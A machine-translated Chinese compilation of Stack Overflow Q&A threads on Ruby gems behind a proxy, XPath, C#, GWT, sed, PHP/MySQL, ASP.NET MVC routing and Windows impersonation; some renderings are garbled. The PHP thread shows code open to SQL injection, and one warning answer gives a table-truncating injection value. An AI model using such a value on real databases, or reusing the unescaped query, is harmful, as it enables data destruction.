> 标签：compass-sass, ruby-1.9.3

我已经在我的系统上安装了 Ruby，现在我想安装 Compass。但是当我执行`gem install compass`命令时，它会显示如下错误：

```
could not find valid gem 'compass' <>=0> in any repositary 
```

并且：

```
SocketError: getadressinfo: no such host is known.<http://rubygems.org/latest_specs.4.8.gz> 
```

我不知道问题是什么。如果我运行`ruby -v`，它会显示 Ruby 版本。那么安装 Compass 有什么问题呢？

谁能正确地向我解释一下？我搜索了谷歌，但我只能找到一些代理问题 - 我根本不明白如何设置代理。

我使用的是 Windows 和公司互联网连接，所以我不知道我的代理的用户名和密码。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2014-08-06T06:03:16.167

我在代理后面，上面 HumberFrench 的解决方案有帮助：

转到 Ruby bin 文件夹：

```
cd c:/Ruby193/bin 
```

然后安装指南针gem：

```
gem install compass --http-proxy http://<proxy_adreess>:<port_of_proxy> 
```

另一个提示：我在 Aptana Studio 上，所以这可以从 Aptana 的终端中运行。

不能投票，所以在这里添加。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2013-02-08T09:13:36.743

我遇到了同样的问题，最后手动解决了。转到 ruby​​gems[指南针](https://rubygems.org/gems/compass)页面，然后单击*下载*链接下载 gem。向下滚动，您将看到三个*Runtime Dependencies*。转到它们中的每一个并下载这些宝石。将它们全部放在一个目录中，然后尝试

```
gem install downloaded_compass_filename 
```

这应该可以解决您的问题。`gem --local install`如果它给出了一个 repository not found 错误消息，你可以通过选项强制 gem 尝试本地文件

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2013-11-13T13:45:52.597

如果您使用代理并出现错误，请执行此操作

```
gem install compass --http-proxy http://<proxy_adreess>:<port_of_proxy> 
```

gem install -h 给你很多选择

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-12-06T17:22:43.480

代理是最可能的原因。您必须获得网络管理员的许可，或手动下载指南针。有关详细信息，请参阅[此](https://stackoverflow.com/questions/4418/how-do-i-update-ruby-gems-from-behind-a-proxy-isa-ntlm)SA 帖子。

如果您决定采用手动路线，这里是指向RubyGems 指南针页面的[链接。](http://rubygems.org/gems/compass)这并不理想，但也比没有指南针魔法必须写 css 更好^^

祝你好运！

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2013-12-03T22:13:01.530

在 Windows 上，我安装了一些红宝石：

```
 C:\ruby187 
```

和

```
 C:\Ruby200-x64 
```

在两个地方安装指南针，使用：

```
 gem install compass 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2013-01-11T21:31:55.347

尝试在 bin 文件夹中运行安装命令。

```
$ cd C:\Your_Ruby_Folder\bin
$ gem install compass 
```

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2013-05-03T23:28:25.407

我有同样的问题，我解决了。

1.  卸载 ruby​​ 结束删除文件夹 ruby
2.  下载 ruby​​ 版本 1.9.x
3.  安装 sass 之后
4.  最后一根：安装指南针

# java - jemmy3发展状况

> ID：13703473
> 
> 赞同：1
> 
> 时间：2012-12-04T12:57:02.287
> 
> 标签：java, swing, acceptance-testing, jemmy, jemmyfx

当我在寻找 Swing UI 测试工具时，我遇到了 Jemmy。根据[本教程](http://jemmy.java.net/Jemmy3UserTutorial.html)，新版本 Jemmy 3 具有非常有前途的查找方法。另一方面，我没有找到安装教程，也没有分发jar。

我克隆了他们的 mercurial 存储库，我可以构建许多子项目中的 1 个。如果我将它们导入到 NetBeans 并解决所有依赖项，我可以构建它们。在我这样做之前，我想知道产品是否已经准备好。

我试图订阅他们的用户邮件列表，但还没有答案。所以，这很可能是否定的：jemmy 3 要么死了，要么团队正在休假。有人知道更具体的吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-30T12:09:06.390

Jemmy v3 非常活跃 - 有相当多的工作在不断进行。

Jemmy v3 的主要客户是 JemmyFX（2.* 和 8），它位于 OpenJFX 存储库中：http: [//hg.openjdk.java.net/openjfx/2.2/master/tests/file/tip/tools/Jemmy/](http://hg.openjdk.java.net/openjfx/2.2/master/tests/file/tip/tools/Jemmy/) [http://hg.openjdk.java.net/openjfx/8/master/tests/file/tip/tools/Jemmy/](http://hg.openjdk.java.net/openjfx/8/master/tests/file/tip/tools/Jemmy/)

JemmyFX 1.3 未开发，因为 Java FX 1.3 未开发。如果您在 JemmyFX 1.3 中有错误，请在 jemmy.java.net 上提交 - 我会看看我能做什么。没有承诺，好像修复需要太多时间，我将无法实现它。

修罗

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:04:07.593

不是一个真正的答案，因为我不知道这个项目。

但是，如果一方面，他们仍然在 JemmyFX 部分提到对 JavaFX 1.3 的支持（1.3 现在已经死了很长时间），我在 Commits 邮件列表中看到了一些活动，所以显然没有完全停止脉冲。

请注意，您可能也会对 FEST 测试框架感兴趣。我没有机会真正尝试它，但它看起来不错。

# c# - 在按键上修改元素属性

> ID：13703477
> 
> 赞同：0
> 
> 时间：2012-12-04T12:57:06.377
> 
> 标签：c#, wpf, xaml

当 TextBox 具有焦点并单击键盘快捷键时，我需要连接一个显示 WPF Popup 控件的事件。例如。在 TextBox 字段中键入时，用户可以按 ALT+H 寻求帮助，以获取显示输入帮助的弹出对话框。在文本框“外部”按 ALT+H 不应打开弹出窗口。

有任何想法吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:06:55.133

看起来像是一个`Attached Event`.

来自 MSDN：

> 附加事件的概念使您能够将特定事件的处理程序添加到任意元素，而不是添加到实际定义或继承事件的元素。在这种情况下，可能引发事件的对象和目标处理实例都没有定义或以其他方式“拥有”事件。

[您可以在 MSDN 上](http://msdn.microsoft.com/en-us/library/bb613550.aspx)找到详细信息

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:08:21.470

使用命令绑定：

```
 ApplicationCommands.Help.InputGestures.Add(new KeyGesture(Key.H, ModifierKeys.Alt));
  this.CommandBindings.Add(new CommandBinding(ApplicationCommands.Help, Help_Executed, Help_Enabled)); 
```

在函数 Help_Executed 中执行一些操作 在函数 Help_Enabled 中检查是否选择了文本框，执行 e.CanExecute = true;

InputGestures 分配 ALT-H 寻求帮助

# xml - XSL / XPath 表达式检查节点是否包含至少一个非空子节点

> ID：13703478
> 
> 赞同：29
> 
> 时间：2012-12-04T12:57:06.410
> 
> 标签：xml, xslt, xpath

我需要检查一个 XML 节点是否至少有一个非空子节点。应用于此 XML，表达式应返回`true`

```
<xml>
    <node>
       <node1/>
       <node2/>
       <node3>value</node3>
    </node>
</xml> 
```

我尝试使用这个表达式：`<xsl:if test="not(/xml/node/child::* = '')">`但它似乎检查**所有**孩子是否都不是空的。

`true`如果**至少一个**元素不为空，我如何编写一个返回的表达式？有没有办法在不创建另一个模板来迭代节点 chldren 的情况下做到这一点？

**UPD：**我正在考虑计算非空节点，
`test="count(not(/xml/node/child::* = '')) &gt; '0'"`
但不知何故无法使其正常工作。这个表达式不是一个格式正确的表达式。

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2012-12-04T13:22:37.153

**更准确、更简单、更高效（无需使用`count()`函数）**：

```
 /*/node/*[text()] 
```

**如果要排除任何只有空白文本子元素的元素，请使用：**

```
 /*/node/*[normalize-space()] 
```

* * *

## 回答 #2

> 赞同：12
> 
> 时间：2012-12-04T13:21:35.657

你只需要`<xsl:if test="/xml/node/* != ''" />`.

在 XPath中，如果集合中的*任何*节点通过比较，则一侧是节点集而另一侧是字符串的`=`or比较成功。因此`!=`

 *```
not(x = '') 
```

意思是“`x`当前节点的任何子元素都不会有空字符串值”，这与

```
x != '' 
```

这意味着“当前节点的至少一个`x`子元素的字符串值不为空”。特别是，如果要检查*所有* `x`孩子是否为空，则需要使用“双阴性”测试

```
not(x != '') 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-12-04T13:11:08.647

这是应该完成这项工作的一个 XPath：

```
count(/*/node/*[text()]) &gt; 0 
```

**在示例 XSLT 中使用时：**

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
  <xsl:output omit-xml-declaration="yes" indent="yes"/>
  <xsl:strip-space elements="*"/>

  <xsl:template match="/">
     <xsl:value-of select="count(/*/node/*[text()]) &gt; 0" />
  </xsl:template>

</xsl:stylesheet> 
```

**...这反过来又应用于提供的示例 XML：**

```
<xml>
  <node>
    <node1/>
    <node2/>
    <node3>value</node3>
  </node>
</xml> 
```

**...产生了预期的结果：**

```
true 
```

**如果我们对一个简单修改的​​ XML 应用相同的 XSLT：**

```
<xml>
  <node>
    <node1/>
    <node2/>
    <node3/>
  </node>
</xml> 
```

**...再次，产生了预期的结果：**

```
false 
```

**解释：**

使用的 XPath 搜索`<node>`具有非空文本值（由 指定）的元素的所有子元素（它们又是根元素的子元素`text()`）；如果此类子项的计数`<node>`大于 0，则 XPath 解析为`true`.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-09-13T03:24:56.170

```
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
    <xsl:output omit-xml-declaration="yes" indent="yes"/>
    <xsl:strip-space elements="*"/>
    <xsl:template match="/">
        <xsl:value-of select="/*/node/*[string-length(text()) &gt;0]!=''"/>
    </xsl:template>
</xsl:stylesheet> 
```

**说明** 这将找到字符串长度大于零的第一个节点，然后将此类节点内容与空字符串进行比较（比较将返回非空字符串节点的存在）；此代码还可用于在任何节点中查找特定标准，例如识别是否存在包含特定字符串或以某个字符或任何其他条件开头的节点；请将此用作节点引用的内部条件，以使代码发挥其魔力。*

# iphone - iOS：什么是音频单元？

> ID：13703481
> 
> 赞同：0
> 
> 时间：2012-12-04T12:57:10.763
> 
> 标签：iphone, ios, cocoa, avaudioplayer, audiounit

音频单元看起来像一个核心音频概念，但我看到它有很多自定义配置，所以我想我可以在 AVAudioPlayer 上使用音频单元的设置吗？但首先，什么是音频单元？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T13:54:39.133

来自 Apple 文档：

> " *iOS 提供音频处理插件，支持混音、均衡、格式转换和实时输入/输出，用于录制、播放、离线渲染和实时对话，如 VoIP（互联网协议语音）。您可以动态加载和使用这些强大而灵活的插件，被称为 “**音频单元***”

你可以在这里找到更多：

[iOS 开发者库 - 使用音频](http://developer.apple.com/library/ios/#documentation/AudioVideo/Conceptual/MultimediaPG/UsingAudio/UsingAudio.html#//apple_ref/doc/uid/TP40009767-CH2-SW6)
[iOS 开发者库 - 关于音频单元托管](http://developer.apple.com/library/ios/#documentation/MusicAudio/Conceptual/AudioUnitHostingGuide_iOS/Introduction/Introduction.html#//apple_ref/doc/uid/TP40009492-CH1-SW1)

# c# - 你调用的对象是空的。- 但我确实初始化了它？

> ID：13703484
> 
> 赞同：0
> 
> 时间：2012-12-04T12:57:26.957
> 
> 标签：c#

我的对象遇到了一些困难。我试图拥有一个我创建的对象（问题）数组：

```
public class Question
{
    public int id = 0;
    public string question = string.Empty;

    public string a1 = string.Empty;
    public string a2 = string.Empty;
    public string a3 = string.Empty;
    public string a4 = string.Empty;

    public int Tanswer = 0;

} 
```

现在我试图在其中设置一些值，如下所示：

```
Question[] arr = new Question[4];

    Random rnd = new Random();

    int i = 0;
    int temp = 0;
    bool ok = false;

    while (i < 3)
    {
        temp = rnd.Next(0, Int32.Parse(dt_count.Rows[0][0].ToString()) - 1);
        for (int j = 0; j < arr.Length; j++)
        {
            arr[j].id = Int32.Parse(dt_q_notMust.Rows[temp][0].ToString());  // ID
            arr[j].question = dt_q_notMust.Rows[temp][1].ToString();  // Question
            arr[j].a1 = dt_q_notMust.Rows[temp][2].ToString();  // A1
            arr[j].a2 = dt_q_notMust.Rows[temp][3].ToString();   // A2
            arr[j].a3 = dt_q_notMust.Rows[temp][4].ToString();  // A3
            arr[j].a4 = dt_q_notMust.Rows[temp][5].ToString();  // A4
            arr[j].Tanswer = Int32.Parse(dt_q_notMust.Rows[temp][6].ToString());  // True Answer (int).

            if (arr[j].id != temp)
            {
                ok = true;

            }
        }

        if (ok)
        {
            i++;
        }
    } 
```

并且由于某种原因它写了一个错误，就像我从来没有初始化它一样：

> 你调用的对象是空的。

但我确实写了：

```
Question[] arr = new Question[4]; 
```

所以我想知道问题是什么？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-04T13:00:17.643

您已经初始化`arr`为一个新数组，但它的所有元素仍然为空。您需要在访问每个项目之前对其进行初始化：

```
arr[j] = new Question();
arr[j].id = Int32.Parse(dt_q_notMust.Rows[temp][0].ToString());
... 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T12:59:55.850

您创建的数组填充了空值，而不是 Question 实例。

> ```
> arr[0] = new Question();
> arr[1] = new Question();
> arr[2] = new Question();
> arr[3] = new Question(); 
> ```

这可以解决问题。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T13:01:23.050

您必须创建数组的每个对象。

```
Question[] arr = new Question[4];

    Random rnd = new Random();

    int i = 0;
    int temp = 0;
    bool ok = false;

    while (i < 3)
    {
        temp = rnd.Next(0, Int32.Parse(dt_count.Rows[0][0].ToString()) - 1);
        for (int j = 0; j < arr.Length; j++)
        {
            arr[j] = new Question();
            arr[j].id = Int32.Parse(dt_q_notMust.Rows[temp][0].ToString());  // ID
            arr[j].question = dt_q_notMust.Rows[temp][1].ToString();  // Question
            arr[j].a1 = dt_q_notMust.Rows[temp][2].ToString();  // A1
            arr[j].a2 = dt_q_notMust.Rows[temp][3].ToString();   // A2
            arr[j].a3 = dt_q_notMust.Rows[temp][4].ToString();  // A3
            arr[j].a4 = dt_q_notMust.Rows[temp][5].ToString();  // A4
            arr[j].Tanswer = Int32.Parse(dt_q_notMust.Rows[temp][6].ToString());  // True Answer (int).

            if (arr[j].id != temp)
            {
                ok = true;

            }
        }

        if (ok)
        {
            i++;
        }
    } 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-04T13:01:08.987

我认为您已经初始化了数组（实际上，您为 4 个项目分配了一些内存），但没有初始化数组中的对象。我现在没有 Visual Studio 来尝试解决方案，但您可以尝试使用已初始化的对象来初始化数组。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-04T13:07:48.007

所以在这里你只需创建一个“数组”实例，它可以包含“问题”类的实例。但是您还没有创建任何“问题”实例。

您可以添加以下行：

```
arr[j] = new Question(); 
```

在设置属性值之前。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-04T14:06:46.417

正如其他人所说，虽然您已经初始化了数组，但您还没有初始化`Array`. 如果将 a`Question`视为值类型更有意义，您可以将其定义为 a`struct`而不是 a `class`，这样初始化`Array`单独就足够了，您可以访问其中的项目以根据需要设置它们的属性，而无需初始化项目。但是，如果您想保留`Question`为一个类，则可以将 包装`Array`在一个类中，该类在访问项目时会延迟初始化它们。

```
public class SelfInitializingArray<T> : IEnumerable<T> where T : class
{
    private Func<T> _builder;
    private T[] _items;

    /// <summary>
    /// Initializes a new instance of the SelfInitializingArray class.
    /// </summary>
    public SelfInitializingArray(int size, Func<T> builder)
    {
        _builder = builder;
        _items = new T[size];
    }

    public IEnumerator<T> GetEnumerator()
    {
        for (int i = 0; i < _items.Length; i++)
        {
            yield return ItemOrDefaultAtIndex(i);
        }
    }

    System.Collections.IEnumerator System.Collections.IEnumerable.GetEnumerator()
    {
        return this.GetEnumerator();
    }

    public T this[int index]
    {
        get
        {
            return ItemOrDefaultAtIndex(index);
        }
        set
        {
            _items[index] = value;
        }
    }

    private T ItemOrDefaultAtIndex(int index)
    {
        if (_items[index] == null)
            _items[index] = _builder();

        return _items[index];
    }
} 
```

然后您可以按如下方式使用它：

```
var questions = new SelfInitializingArray<Question>(4, () => new Question());

questions[0].Id = 12345; //etc. 
```

# gwt - GWT DataGrid/CellTable：选择多个页面

> ID：13703487
> 
> 赞同：1
> 
> 时间：2012-12-04T12:57:44.080
> 
> 标签：gwt, datagrid, pager, celltable, selectionmodel

`DataGrid`我正在使用带有 a和 a 的GWT 2.4`SimplePager`以及`MultiSelectionModel`. 我想在**所有**页面上实现一个简单*的全选功能。*

 **我只能选择当前页面上的所有可见项目。选择所有页面上的所有项目的最佳方法是什么？

我知道将对象`MultiSelectionModel`提供的代理密钥存储在. 我想我必须从服务器请求所有代理对象或至少所有*键*。但实际上我不想在服务器端存储有关´s方法的信息。但我也无法访问所选代理的键。这一切看起来都很麻烦，那么有没有更好的方法来解决这个问题？`ProvidesKey``HashMap`*`ProvidesKey``getKey()``MultiSelectionModel``HashMap`*

 ** * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T17:35:55.313

为什么全选需要所有键？当您从列表中选择*一些*对象时，您需要记住选择了哪些对象，但是当您选择*所有*对象时，您需要一个布尔值：

```
// on click Select All button/checkbox
boolean selectAll = true;
// ask a user what he wants to do
// send a request to server with a parameter selectAll to update/delete all objects 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T18:33:18.360

如[https://developers.google.com/web-toolkit/doc/latest/DevGuideUiCellWidgets#selection](https://developers.google.com/web-toolkit/doc/latest/DevGuideUiCellWidgets#selection)中所述，实现此目的的一种方法是实现您自己的 SelectionModel（例如，通过扩展 AbstractSelectionModel 或 DefaultSelectionModel）：

> 一个复杂的实现可以使用一个布尔值来处理跨多个页面的“全选”，以指示所有内容都被选中，然后跟踪否定选择。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-05T06:10:52.120

仅当您**不**延迟加载时，才能跨多个页面选择所有内容。首先为什么要全选？如果您想对所有网格数据执行一些操作，您将拥有列表，您可以直接在列表上执行您的操作。尽管如此，您可以通过遍历列表并在每个项目上使用以下 API 来选择多个页面上的所有网格行。

```
 public void setSelected(T item, boolean selected); 
```

**注意：** *这仅在您**不**延迟加载时才有效。****

# bash - 带有“$”替换的 BASH/SED 不起作用

> ID：13703488
> 
> 赞同：0
> 
> 时间：2012-12-04T12:57:46.067
> 
> 标签：bash, sed

我有一个 bash 脚本，其中列出了子程序/进程，如果用户选择，可以将启动标志插入特定程序。我想匹配以下格式的字符串，并且根据用户选择的 pgm，我想用 {PGMPATH}/pgm 前面的新标志插入/替换字符串。现有程序根据以下内容列在启动文件中：

```
start -existingFlag ${PGMPATH}/pgm
start -existingFlag -anotherExistingFlag ${PGMPATH}/anotherPgm
start -existingFlag -anotherFlag ${PGMPATH}/yetAnotherPgm otherStuff 
```

但首先我尝试匹配硬编码字符串（将来会匹配启动文件中的行）：

```
start -existingFlag ${PGMPATH}\/pgm* 
```

并将其替换为如下所示的新行：

```
*start -existingFlag -newFlag ${PGMPATH}\/pgm* 
```

从脚本：

```
existingString="start -existingFlag ${PGMPATH}\/pgm"
newString="start -existingFlag -newFlag ${PGMPATH}\/pgm"
sed 's/$replaceString/$newString/g' $STARTUPCONFFILE 
```

只要字符串中没有“$”（就在 {PGMPATH} 之前），它就可以工作（字符串被替换），但只要我在 ${PGMPATH} 中添加“$”，SED 就不会替换。我已经尝试了很多，但我无法让它工作。

建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T13:10:38.490

您需要双引号为 shell 扩展变量：

```
$ set newString=1                                                         
$ set replaceString=one

# using single quotes: no expansion -> no replacement!              
$ echo one | sed 's/$replaceString/$newString/g'
one

# using double quotes: expansion -> replacement!
$ echo one | sed "s/$replaceString/$newString/g"
1 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:21:27.117

我认为，$PGMPATH 中会有斜线。它们会干扰 sed 语法。

您可以使用其他字符，例如 | 或 % 作为分隔符，而不是通常的`/`.
例如尝试：

```
sed "s|$replaceString|$newString|g" 
```

或者，您可以使用[此处 sed 手册](http://www.gnu.org/software/sed/manual/sed.html#Addresses)`\%regexp%`中给出的语法。（虽然我自己没有使用过它..）

另一种选择是转义 $PGMPATH 中的所有斜线，使用另一行 sed; 但这会更困难。

此外，正如 sudo_O 所指出的，我已将单引号更改为双引号，因为当用单引号引用时，变量不会扩展。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:00:43.643

`echo $PATH`打印什么？您是否知道 PATH 通常是用冒号分隔的目录列表？这真的是你想要的吗？它将扩展到，例如

```
start -existingFlag /usr/bin:/bin:/usr/local/bin/pgm 
```

这肯定不是您所期望的。也许你有一个变量名冲突，应该使用另一个名称而不是`PATH`.

# php - 在同一个查询中搜索所有

> ID：13703490
> 
> 赞同：0
> 
> 时间：2012-12-04T12:57:48.610
> 
> 标签：php, html, mysql

表（书）==>（keyid，名称）

```
<form action="se.php">
    <select>
    <option value="1">book1</option>
    <option value="2">book2</option>
    <option value="3">book3</option>
    <option value="????">All Book</option>
    </select>
<input type="submit" name="search" value="search">
</form>

//se.php 
    $keyid=$_GET[keyid];
    $sql=mysql_query("SELECT `name` FROM `book` WHERE `keyid`='$keyid'");
//end page 
```

我为sql查询搜索所有内容的最后一个选项值（？？？？？？）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T13:00:51.260

全部

然后：

```
$where = '';

if $keyid != all then {
  $where = WHERE `keyid`= $keyid // escape value protect from sql injection!
}

mysql_query("SELECT `name` FROM `book` $where"); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T13:00:38.577

这应该这样做：

```
$keyid=mysql_real_escape_string($_GET[keyid]);
if(trim($keyid)!="")
    $where = " `keyid`='$keyid' ";
else
    $where = " 1 ";
$sql=mysql_query("SELECT `name` FROM `book` WHERE $where "); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-04T13:05:53.423

您的代码在防止 sql 注入方面非常薄弱。您应该逃避您的输入，并且永远不要相信您收到的值。在您的选项中考虑这个值：

```
<option value="';truncate table book;">All Book</option> 
```

一个好的方法是@cojack 的答案

# asp.net-mvc-3 - MVC 基于角色的路由说明

> ID：13703491
> 
> 赞同：1
> 
> 时间：2012-12-04T12:57:50.477
> 
> 标签：asp.net-mvc-3, asp.net-mvc-routing, asp.net-mvc-areas

一个很长的解释结束时的小问题......

假设属于管理员角色的管理员用户和属于用户角色的普通用户尝试使用在 Global.asax 中注册的以下路由访问索引页面。

```
 routes.MapRoute(
     "Default", // Route name
     "{controller}/{action}/{id}", // URL with parameters
      new { controller = "Home", action = "Index", id = UrlParameter.Optional }, 
      new[] {"tst.Controllers"}
 ); 
```

在 HomeController 中，Index Action Method 用 Authorize 属性修饰。

```
[Authorize]
public ActionResult Index()
{
    ViewBag.Message = "Welcome to ASP.NET MVC!";

    return View();
} 
```

强制匿名用户登录。

如果管理员用户使用他/她的凭据登录，我想将他/她重定向到位于管理区域的 HomeController 中的索引操作方法。

如果普通用户登录，我想将他/她重定向到位于用户区域的 HomeController 中的索引操作方法。

我在 UserAreaRegistration.cs 中有以下代码

```
public override void RegisterArea(AreaRegistrationContext context)
{
  context.MapRoute(
  "User", 
  "Profile/{action}", 
  new { area = AreaName, Controller = "Home", action = "Index" }, 
  new { RoleConstraint = new RoleConstraint()},
  new[]{ "tst.Areas.User.Controllers"}
  );
} 
```

以及 AdminAreaRegistration.cs 的以下代码

```
public override void RegisterArea(AreaRegistrationContext context)
{
  context.MapRoute(
  "Admin", 
  "Profile/{action}", 
  new { area = AreaName, Controller = "Home", action = "Index" }, 
  new { RoleConstraint = new RoleConstraint()},
  new[]{ "tst.Areas.Admin.Controllers"}
  );
} 
```

其中 RoleConstraint 定义如下

```
public class RoleConstraint: IRouteConstraint
{
    public bool Match(
        HttpContextBase httpContext, 
        Route route, 
        string parameterName, 
        RouteValueDictionary values, 
        RouteDirection routeDirection)
    {
        RoleProvider rp = new tst.Providers.CustomRoleProvider();
        string[] roles = rp.GetRolesForUser(httpContext.User.Identity.Name);
        if (roles != null && roles.Length > 0)
        {
            string roleName = roles[0];
            string areaName = route.Defaults["area"].ToString();
            return areaName == roleName;            
        }
        return false;
    }
} 
```

主控制器文件夹中 AdminController 中的标准 LogOn 操作方法...

```
 [HttpPost]
 public ActionResult LogOn(LogOnModel model, string returnUrl)
 {
   if (ModelState.IsValid)
   {
     if (Membership.ValidateUser(model.UserName, model.Password))
     {
       FormsAuthentication.SetAuthCookie(model.UserName, model.RememberMe);
       if (Url.IsLocalUrl(returnUrl) 
           && returnUrl.Length > 1 
           && returnUrl.StartsWith("/")
           && !returnUrl.StartsWith("//") 
           && !returnUrl.StartsWith("/\\"))
       {
           return Redirect(returnUrl);
       }
       else
       {
           return RedirectToAction("Index", "Home");
       }
     }
     else
     {
       ModelState.AddModelError("", "The user name or password is incorrect.");
     }
   }

   // If we got this far, something failed, redisplay form
   return View(model);
 } 
```

**问题：** 我的想法是否正确，当验证管理员/普通用户时，他/她必须在上面代码片段的这一行中重定向

```
return RedirectToAction("Index", "Home"); 
```

到相应的索引操作方法（阅读：相应区域中的索引操作方法）。

*如果是这样，我想知道如何。*

我很困惑，因为涉及到一个常量字符串“Profile”，它不是涉及操作方法和控制器名称的常见内容。“配置文件”既不是控制器也不是操作方法。

受这篇文章的启发 [MVC 基于角色的路由](https://stackoverflow.com/questions/8181284/mvc-role-based-routing)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-06T13:28:05.237

代替

```
return RedirectToAction("Index", "Home"); 
```

在登录操作方法中，我将其替换为

```
return Redirect("/Profile"); 
```

有效 ！！！

但是，我不明白的是，当我单击注销时，它会在主视图文件夹中呈现索引页面。所以我必须再次单击 LogOff 才能返回 LogOn 页面。

# javascript - jQuery 警报在 ie onchange 中不起作用

> ID：13703492
> 
> 赞同：1
> 
> 时间：2012-12-04T12:57:54.883
> 
> 标签：javascript, jquery, onchange

互联网探索中的 onchange 事件时不会发出警报？

**我使用下面的代码：**

```
<input type="file" onChange="readURL(this)"  />
<script src="http://code.jquery.com/jquery-1.8.0.min.js " > </script>
<script>
function readURL(input) {
    if (input.files && input.files[0]) {
        var reader = new FileReader();
        alert('asf');
        reader.onload = function(e) {
            //alert(e.target.result);
            $('#photoview').attr('src', e.target.result);
        }
        reader.readAsDataURL(input.files[0]);
    }
}
</script> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:01:27.873

IE9 没有 FileReader。

[请参阅本 MDN 文档](https://developer.mozilla.org/en-US/docs/DOM/FileReader)末尾的兼容性表。请注意，本文档还提出了与 IE 兼容的解决方案。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T13:32:10.450

对于 IE，你必须使用`FileSystemObject`activex 组件

有关更多详细信息，请查看此链接：

[http://www.java2s.com/Tutorial/JavaScript/0600__MS-JScript/FileSystemObjectGetFile.htm](http://www.java2s.com/Tutorial/JavaScript/0600__MS-JScript/FileSystemObjectGetFile.htm)

# c#-4.0 - 模拟不同机器的帐户（远程用户）

> ID：13703495
> 
> 赞同：1
> 
> 时间：2012-12-04T12:58:03.200
> 
> 标签：c#-4.0, impersonation

是否可以通过模拟登录到不同机器的帐户？我必须访问该文件夹并临时读取其内容。读取进程程序后，将恢复到无法访问该文件夹的旧帐户。我能够在同一域下模拟不同的帐户并且它可以工作。但是，我必须更新我的代码才能访问不同的机器。我想修改这段代码：

```
public WindowsImpersonationContext ImpersonateUser(string sUsername, string sDomain, string sPassword)
        {
            // initialize tokens
            IntPtr pExistingTokenHandle = new IntPtr(0);
            IntPtr pDuplicateTokenHandle = new IntPtr(0);
            pExistingTokenHandle = IntPtr.Zero;
            pDuplicateTokenHandle = IntPtr.Zero;

            // if domain name was blank, assume local machine
            if (sDomain == "")
                sDomain = System.Environment.MachineName;

            try
            {
                string sResult = null;

                const int LOGON32_PROVIDER_DEFAULT = 0;

                // create token
                const int LOGON32_LOGON_INTERACTIVE = 2;
                //const int SecurityImpersonation = 2;

                // get handle to token
                bool bImpersonated = LogonUser(sUsername, sDomain, sPassword,
                    LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, ref pExistingTokenHandle);

                // did impersonation fail?
                if (false == bImpersonated)
                {
                    int nErrorCode = Marshal.GetLastWin32Error();
                    sResult = "Error while logging. Error Code: " + nErrorCode + "\r\n";

                    // show the reason why LogonUser failed
                    MessageBox.Show(this, sResult, "Hata", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return null;
                }

                // Get identity before impersonation
                sResult += "Before impersonation: " + WindowsIdentity.GetCurrent().Name + "\r\n";

                bool bRetVal = DuplicateToken(pExistingTokenHandle, (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, ref pDuplicateTokenHandle);

                // did DuplicateToken fail?
                if (false == bRetVal)
                {
                    int nErrorCode = Marshal.GetLastWin32Error();
                    CloseHandle(pExistingTokenHandle); // close existing handle
                    sResult += "DuplicateToken() failed with error code: " + nErrorCode + "\r\n";

                    // show the reason why DuplicateToken failed
                    MessageBox.Show(this, sResult, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return null;
                }
                else
                {
                    // create new identity using new primary token
                    WindowsIdentity newId = new WindowsIdentity(pDuplicateTokenHandle);
                    WindowsImpersonationContext impersonatedUser = newId.Impersonate();

                    // check the identity after impersonation
                    sResult += "After impersonation: " + WindowsIdentity.GetCurrent().Name + "\r\n";

                    MessageBox.Show(this, sResult, "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return impersonatedUser;
                }
            }
            catch (Exception ex)
            {
                throw ex;
            }
            finally
            {
                // close handle(s)
                if (pExistingTokenHandle != IntPtr.Zero)
                    CloseHandle(pExistingTokenHandle);
                if (pDuplicateTokenHandle != IntPtr.Zero)
                    CloseHandle(pDuplicateTokenHandle);
            }
        } 
```

# couchdb - 用于分布式多用户音频存储库的 CouchDB 数据库设计

> ID：13703500
> 
> 赞同：4
> 
> 时间：2012-12-04T12:58:35.830
> 
> 标签：couchdb

